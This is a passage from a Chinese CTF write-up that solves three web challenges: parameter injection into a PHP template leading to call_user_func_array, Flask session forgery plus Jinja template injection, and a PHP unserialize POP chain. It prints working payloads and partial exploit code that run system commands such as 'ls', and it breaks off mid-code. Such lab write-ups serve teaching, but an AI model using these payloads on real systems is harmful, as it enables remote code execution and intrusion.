<p>这个方法东西有点多，我就把最主要的拿出来吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$params</span> = explode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">    <span class="variable">$var</span> = substr(<span class="variable">$t</span>, <span class="number">0</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">    <span class="variable">$val</span> = substr(<span class="variable">$t</span>, strpos(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123;</span><br><span class="line">         <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: </span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&#x27;name参数不存在&#x27;</span>;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (!function_exists(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&#x27;函数[&#x27;</span>.<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;]未定义&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$force</span>) &#123;</span><br><span class="line">         <span class="variable">$p</span> = [];</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (strpos(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="variable">$n</span> = intval(substr(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                 <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func_array(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable">$rt</span> = call_user_func(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p><code>explode</code>将<code>$_params</code>以空格进行分割并返回数组形式，使得之后的遍历和赋值得以实现（自己去看源码理解</p>
<p>接下去第一段，判断<code>$param[&#39;name&#39;]</code>是否为定义并且是否为函数；</p>
<p>第二段，判断<code>$force</code>是否定义，若已定义那么再遍历<code>$param</code>并判断是否存在<code>param</code>键值，若存在那么就给<code>$p</code>赋值，若<code>$p</code>被赋值那么进入下面的if，利用<code>call_user_func_array</code>函数执行<code>$param[&#39;name&#39;]</code>函数，而<code>$p</code>的值则为该函数的参数</p>
<p><strong>0x03:admin/index.htmk</strong></p>
<p>发现三行php代码，看这三个变量<code>$img  $version  $mod</code>，前面两个是不是很眼熟，正式<code>Temp</code>类中<code>date</code>数组里面的，而经过变量覆盖之后我们可以调用，那么这里的<code>$mod</code>不是原数组里面的，那么说明我们可以通过post传参从而实现调用<code>$mod</code>，然后进入listdata方法，绕过一个个if语句到最后的<code>call_user_func_array($param[&#39;name&#39;], $p)</code>进行代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&lt;?php echo $img;?&gt;&quot;&gt;</span><br><span class="line">&lt;div&gt;&lt;?php echo $this-&gt;listdata(&quot;action=list module=$mod&quot;);?&gt;&lt;div&gt;</span><br><span class="line">&lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt;</span><br></pre></td></tr></table></figure>

<p><strong>0x04:解题+总结</strong></p>
<p>现在代码都走一遍了，但是要怎么调用<code>call_user_func_array</code>，还是有点迷惑，这里重点在于<code>explode</code>函数，因为他会将我们传入的<code>mod</code>通过空格分隔出来，就比如源代码是<code>action=list module=$mod</code>，最后就会被分成<code>action=list</code>和<code>module=$mod</code>,那么如果我们<code>$mod</code>传入的时候就会自带空格呢，直接举个例子吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(2) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;</span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;    </span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a action=function name=1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;action=list module=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = explode(<span class="string">&quot; &quot;</span>,<span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//array(4) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(11) &quot;action=list&quot;    </span></span><br><span class="line"><span class="comment">//  [1]=&gt;</span></span><br><span class="line"><span class="comment">//  string(8) &quot;module=a&quot;        </span></span><br><span class="line"><span class="comment">//  [2]=&gt;</span></span><br><span class="line"><span class="comment">//  string(15) &quot;action=function&quot;</span></span><br><span class="line"><span class="comment">//  [3]=&gt;</span></span><br><span class="line"><span class="comment">//  string(6) &quot;name=1&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>

<p>清晰明了，因为在遍历中会出现两次<code>action</code>，那么前面的list肯定就会被后面的function给覆盖了呀，那么应该都懂了最后我们<code>$mod</code>的构造方法了吧，那之后只要根据代码构造我们想要的东西就好了</p>
<p>payload:</p>
<p>（为什么要用%09呢，dddd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">filename=index.html</span><br><span class="line">post:</span><br><span class="line">space=admin &amp;</span><br><span class="line">mod=1 action=function name=system force=1 param=ls%09/</span><br></pre></td></tr></table></figure>

<h5 id="EasyPython"><a href="#EasyPython" class="headerlink" title="EasyPython"></a>EasyPython</h5><p>工具：<a href="https://github.com/noraj/flask-session-cookie-manager">flask session</a></p>
<p>flask session伪造 + 简单的模板注入</p>
<p>既然题目说是python，那么直接试着在filename上查看<code>app,py</code>,可以直接得到源码</p>
<p><strong>0x01:</strong></p>
<p>存在secret_key <code>app.config[&#39;SECRET_KEY&#39;]=secret.SECRET_KEY</code>，而SECRET_KEY取值于在secret.py文件中</p>
<p><strong>0x02:/source</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>,<span class="string">&#x27;jinchengshu.jpg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.py&quot;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        f = <span class="string">&quot;&quot;</span>.join(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).readlines())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nononono! you too young!give you source!! &lt;br&gt;&quot;</span>+f</span><br><span class="line">    f = <span class="string">&quot;let&#x27;s look look shuaige&#x27;s pho;He is so handsome. He used to be called jinchengwu, but now he is called jinchengshu;&lt;br&gt;&lt;br&gt;&quot;</span></span><br><span class="line">    f += <span class="string">&quot;&lt;img src=data:image/jpeg;base64,&quot;</span>+base64.b64encode(<span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()).decode()+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.get方式传filename并对其内容进行进行判断，以<code>.py</code>为结尾、包含<code>flag or ..</code>则返回当前文件的内容</p>
<p>2.<code>base64.b64encode(open(filename,&#39;rb&#39;).read()).decode()</code>实现读取文件的源码</p>
<p>现在我们已知<code>SECRET_KEY</code>在secret文件中，并且还可以通过代码得到源码，所以我们要先绕过第一个if并且读取出secret.py文件里面的内容</p>
<p>hint： <code>__pycache__</code> （自行百度吧</p>
<p>百度之后并测试之后可以得到文件的路径是</p>
<p>payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=./__pycache__/secret.cpython-35.pyc （这里的35是python的版本，因为本地测试的时候39，但题目的python版本的3.5</span><br></pre></td></tr></table></figure>

<p>然后就可以得到源码，解密得到Secret-Key</p>
<p><strong>0x03:/ssti</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(session)</span><br><span class="line">    info = session[<span class="string">&quot;info&quot;</span>]</span><br><span class="line">    data = request.form.get(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(data)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have one more try young man&quot;</span></span><br></pre></td></tr></table></figure>

<p>1.这里只有一个点就是<code>info[&quot;admin&quot;]==&quot;admin&quot;</code>，等式成功之后就会导致<code>render_template_string(data)</code>，对data的值进行渲染造成模板注入</p>
<p>注意这里的info的值来自于session，那么直接查看session是什么样的。可以发现session被分成了三段，再根据题目flask，可以大胆猜测是flask session伪造（主要是之前做过同类型题目</p>
<p><img src="http://82.156.2.166/static/img/image-20211129183924992.png"></p>
<p>既然前面已经拿到<code>SECRET_KEY</code>了，那么就直接用工具加密，然后修改session，传data进行模板注入</p>
<p>payload2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session：eyJpbmZvIjp7ImFkbWluIjoiYWRtaW4ifX0.YaN-KQ.tuTHvwPH5IxVm0ct06b9d8F1iZc </span><br></pre></td></tr></table></figure>

<p>payload3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[375].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Ezunser"><a href="#Ezunser" class="headerlink" title="Ezunser"></a>Ezunser</h5><p>反序列化未定义的类</p>
<p>直接给了源码：</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>先审计<code>index.php</code></p>
<p>第一个点在于<code>spl_autoload_register</code>，当调用<code>index.php</code>中没有定义的类的时候就会自动调用<code>myAutoloader($classname)</code>，其中<code>$classname</code>就是我们想实例化的类</p>
<p>想当然地我们想调用<code>EvilClass.php</code>里面的类，所以要<code>include EvilClass.php</code>，但是文件里还是没有定义<code>EvilClass</code>，这里就涉及到一个[php反序列的冷知识](<a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识 - 知乎 (zhihu.com)</a>)</p>
<p>我们还发现之后的if判断语句中ban掉了<code>Evil</code>，这就说明在序列化之后的字符串中不能再出现<code>EvilClass</code>，不过可以直接拿里面的payload</p>
<p>所以payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><code>EvilClass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;read();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;lock lock read!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$b</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;learn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        B::<span class="variable">$a</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;see();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>0x02:</strong></p>
<p>之后就是开始利用<code>EvilClass.php</code>了</p>
<p>前面到A的pop链比较简单：</p>
<p>1.从<code>__destruct</code>出发，利用die返回字符串调用<code>__toString</code></p>
<p>2.然后在C中实例化D，调用read方法</p>
<p>3.D中实例化F，调用<code>__call</code>魔术方法</p>
<p>4.F中实例化E，调用<code>__invoke</code>魔术方法，再实例化A进去see方法</p>
<p>之后的重点就是<code>see</code>了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">       <span class="variable">$checker</span> = <span class="keyword">new</span> ReflectionClass(get_class(<span class="variable">$b</span>));</span><br><span class="line">       <span class="variable">$a</span> = basename(<span class="variable">$checker</span>-&gt;getFileName());</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">&#x27;EvilClass.php&#x27;</span>&amp;&amp;B::<span class="variable">$a</span>&amp;&amp;B::<span class="variable">$b</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;a)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$b</span>-&gt;b))&#123;</span><br><span class="line">               <span class="variable">$func</span> = <span class="variable">$b</span>-&gt;a;</span><br><span class="line">               <span class="variable">$args</span> = <span class="variable">$b</span>-&gt;b;</span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;</span>,<span class="string">&quot;<span class="subst">$func</span>(\&quot;<span class="subst">$args</span>\&quot;)&quot;</span>,<span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">if</span>(!in_array(<span class="variable">$match</span>[<span class="number">1</span>],B::<span class="variable">$allowfunc</span>)&amp;&amp;function_exists(<span class="variable">$match</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$match</span>[1](\&quot;<span class="subst">$match</span>[2]\&quot;);&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x03:</strong></p>
<p>这里卡了两次</p>
<p>1.从第一个if里面可以知道<code>$this-&gt;b</code>实例化的类不能是<code>EvilClass.php</code>文件中存在的类，所以现在只能利用原生类了，利用脚本找原生类的时候总是过不去，要么说未定义要么直接<code>bad request</code>，后来出了hint &gt;&gt; <code>stdClass</code>，这样第一个if和第二个if过了</p>
<p>2.第三个if进行正则匹配，一开始又试了半天，最后可以发现我们构造的payload的形式可以是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$func=var_dump(&#x27;&#x27;);system  // 如果想在var_dump里面执行命令的话，直接用反引号就可以的 var_dump(`ls`);</span><br><span class="line">$args=ls</span><br></pre></td></tr></table></figure>

<p>(之后给的那个干货好像没用过</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class stdClass&#123;</span></span><br><span class="line"><span class="comment">//     pubLic function __construct()&#123;</span></span><br><span class="line"><span class="comment">//         $this-&gt;a = &#x27;var_dump(`ls`);system&#x27;;</span></span><br><span class="line"><span class="comment">//         $this-&gt;b = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>  ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;a = <span class="string">&#x27;var_dump(`ls`);system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b-&gt;b = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">see</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $b = $this-&gt;b; // new A</span></span><br><span class="line">        <span class="comment">// $checker = new ReflectionClass(get_class($b));</span></span><br><span class="line">        <span class="comment">// $a = basename($checker-&gt;getFileName());</span></span><br><span class="line">        <span class="comment">// if($a != &#x27;EvilClass.php&#x27;&amp;&amp;B::$a&amp;&amp;B::$b)&#123;</span></span><br><span class="line">        <span class="comment">//     if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;</span></span><br><span class="line">        <span class="comment">//         $func = $b-&gt;a;</span></span><br><span class="line">        <span class="comment">//         $args = $b-&gt;b;</span></span><br><span class="line">        <span class="comment">//         if(preg_match(&#x27;/(\S+)\(&quot;([^)\\\\\&quot;\x00-\x19;,&#123;&#125;$]+)&quot;\)/m&#x27;,&quot;$func(\&quot;$args\&quot;)&quot;,$match))&#123;</span></span><br><span class="line">        <span class="comment">//             if(!in_array($match[1],B::$allowfunc)&amp;&amp;function_exists($match[1]))&#123;</span></span><br><span class="line">        <span class="comment">//                 die(&quot;not allow&quot;);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line">        <span class="comment">//             eval(&quot;$match[1](\&quot;$match[2]\&quot;);&quot;);</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$allowfunc</span> = [<span class="string">&quot;var_dump&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> D();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;a-&gt;read();</span></span><br><span class="line">        <span class="comment">// return &quot;lock lock read!&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> F();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$b = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;learn();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// B::$a = true;</span></span><br><span class="line">        <span class="comment">// $this-&gt;b-&gt;see();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span 